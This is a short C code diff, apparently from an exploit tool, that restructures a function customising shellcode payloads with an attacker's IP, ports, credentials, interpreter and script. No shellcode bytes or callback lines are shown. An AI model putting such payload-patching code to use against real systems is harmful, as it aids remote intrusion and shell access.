@@ -85,7 +85,7 @@ void set_interpreter(char *shellcode, char *_interpreter)
     strncpy(ptr, interpreter, interp_len);
 }
 
-//
+// script code
 void set_script(char *shellcode, char *_cmd)
 {
     char *ptr = NULL;
@@ -142,23 +142,22 @@ void patchcode(char *shellcode, uint16_t PORT_IN, uint32_t IP, uint16_t PORT_OUT
 
 }
 
-//
+// main function
 void personalize_shellcode(void)
 {
     //printf("[DBG] Payload before personalization:\n%s\n", sh_buffer);
-    if( args.payload_index != 4 &&  args.payload_index != 5) {
-        if(args.my_ip) set_ip(sh_buffer, args.my_ip);
-        if(args.my_port) set_port(sh_buffer, args.my_port);
-        if(args.my_username) set_username(sh_buffer, args.my_username);
-        if(args.my_password) set_password(sh_buffer, args.my_password);
-    }
-    else if(args.payload_index == 4) {
+    if(args.payload_index == 4) {
         patchcode(sh_buffer, args.my_port, args.my_ip, args.my_port2);
     }
     else if(args.payload_index == 5) {
      set_interpreter(sh_buffer, args.interpreter);
      set_script(sh_buffer, args.script_code);
     }
+    else {
+        if(args.my_ip) set_ip(sh_buffer, args.my_ip);
+        if(args.my_port) set_port(sh_buffer, args.my_port);
+        if(args.my_username) set_username(sh_buffer, args.my_username);
+        if(args.my_password) set_password(sh_buffer, args.my_password);
+    }
     //printf("[DBG] Payload after personalization:\n%s\n", sh_buffer);
 }
-
